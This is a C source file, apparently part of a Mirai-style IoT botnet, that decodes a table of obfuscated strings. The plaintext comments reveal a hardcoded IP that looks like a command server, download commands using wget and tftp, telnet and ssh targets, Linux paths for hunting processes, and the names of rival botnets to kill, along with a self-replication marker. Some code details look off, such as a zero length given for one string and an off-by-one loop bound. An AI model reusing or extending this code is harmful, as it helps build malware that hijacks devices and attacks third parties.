#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#define MAX_VALUES 56

static void encrypt_string(uint8_t id, char *buf, int buf_len);

char encodes[] = {
  'x', 'm', '@', '_', ';', 'w', ',', 'B', '-', 'Z', '*', 'j', '?', 'n', 'v', 'E',
  '|', 's', 'q', '1', 'o', '$', '3', 'T', '7', 'z', 'K', 'C', '<', 'F', ')', 'u',
  't', 'A', 'r', '.', 'p', '%', '=', '>', '4', 'i', 'h', 'g', 'f', 'e', '6', 'c',
  'b', 'a', '~', '&', '5', 'D', 'k', '2', 'd', '!', '8', '+', '9', 'U', 'y', ':'
};

char decodes[] = {
  '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',
  'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
  'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
  'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', '-', '/', '.', ' '
};

struct encryption_val {
  char *val;
  char decoded[512];
  uint16_t val_len;
}; struct encryption_val table[MAX_VALUES + 1];

void encryption_init(void) {
  encrypt_string(1, "Cv|q<FvC", 8); // register
	encrypt_string(2, "Cv37uv", 7); // remove
	encrypt_string(3, "<Fn", 3); // std
	encrypt_string(4, ")nz", 3); // udp
  encrypt_string(5, "sFFz", 4); // http
  encrypt_string(6, "F?z", 3); // tcp
  encrypt_string(7, "T7:T*3v", 7); // no name
  encrypt_string(8, "m-wy@;;y@wymBB", 14); // 185.244.25.177
  encrypt_string(9, "8*F:.)$$vT:tv:nCqTovT", 21); // Wat zullen we drinken
  encrypt_string(10, "h42", 3); // GET
  encrypt_string(11, "g22&", 4); // HTTP
  encrypt_string(12, "mym", 3); // 1.1
  encrypt_string(13, "g7<F", 4); // Host
  encrypt_string(14, "=7TTv?Fq7T", 10); // Connection
  encrypt_string(15, "?$7<v", 5); // close
  encrypt_string(16, "UzC7?U", 6); // /proc/
  encrypt_string(17, "U3*z<", 5); // /maps
  encrypt_string(18, "U?3n$qTv", 8); // /cmdline
  encrypt_string(19, "nv$vFvn", 7); // deleted
  encrypt_string(20, "UF3zU", 5); // /tmp/
  encrypt_string(21, "UC77FU", 6); // /root/
  encrypt_string(22, "Un*F*U$7?*$UF3z", 16); // /data/local/tmp/
  encrypt_string(23, "Uu*CUF3zU", 9); // /var/tmp/
  encrypt_string(24, "3qz<", 4); // mips
  encrypt_string(25, "*C3", 3); // arm
  encrypt_string(26, "3z<$", 4); // mpsl
  encrypt_string(27, "s*o*q", 5); // hakai
  encrypt_string(28, "KFA", 3); // qtx
  encrypt_string(29, "s7s7", 4); // hoho
  encrypt_string(30, "<vE*", 4); // sefa
  encrypt_string(31, "<n*", 3); // sda
  encrypt_string(32, "3Fn", 3); // mtd
  encrypt_string(33, "UzC7?UTvFUF?z", 13); // /proc/net/tcp
  encrypt_string(34, "UEnU", 4); // /fd/
  encrypt_string(35, "UvAv", 4); // /exe
  encrypt_string(36, "<<sn", 4); // sshd
  encrypt_string(37, "<no", 3); // sdk
  encrypt_string(38, "t|vF:sFFz", 9); // wget http://
  encrypt_string(39, "FEFz:9|:9$", 10); // tftp -g -l
  encrypt_string(40, "v?s7:9v", 7); // echo -e
  encrypt_string(41, "Fv$TvF", 6); // telnet
  encrypt_string(42, "<v$ECvz", 7); // selfrep
  encrypt_string(43, "7t*Cq", 5); // owari
  encrypt_string(44, "<7C*", 4); // sora
  encrypt_string(45, "Fs*T7<", 6); // thanos
  encrypt_string(46, "|v3qTq", 6); // gemini
  encrypt_string(47, "Ej7F", 4); // fbot
  encrypt_string(48, "o7t*q", 5); // kowai
  encrypt_string(49, "17<s7", 5); // josho
  encrypt_string(50, "Tvo7", 4); // neko
  encrypt_string(51, "?73z@Zx_", 8); // comp2903
  encrypt_string(52, "Fv$TvFn", 7); // telnetd
  encrypt_string(53, "UjqTUj)<rj7A:z<", 15); // /bin/busybox ps
  encrypt_string(54, "kkg", 3); // SSH
  encrypt_string(55, "<<s", 3); // ssh
  encrypt_string(56, "yU", 0); // ./
}

char *encryption_decode(int id, int *len) {
  struct encryption_val *val = &table[id];
  int i, c;

  if (len != NULL)
    *len = (int)val->val_len;

	memset(val->decoded, 0, sizeof(val->decoded));
  for(i = 0; i < val->val_len; i++)
  {
    for(c = 0; c <= sizeof(decodes); c++)
    {
    	if(val->val[i] == encodes[c])
    		val->decoded[i] = decodes[c];
    }
  }
  val->decoded[i] = '\0';

  return val->decoded;
}

static void encrypt_string(uint8_t id, char *buf, int buf_len) {
    char *cpy = malloc(buf_len);

    memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}
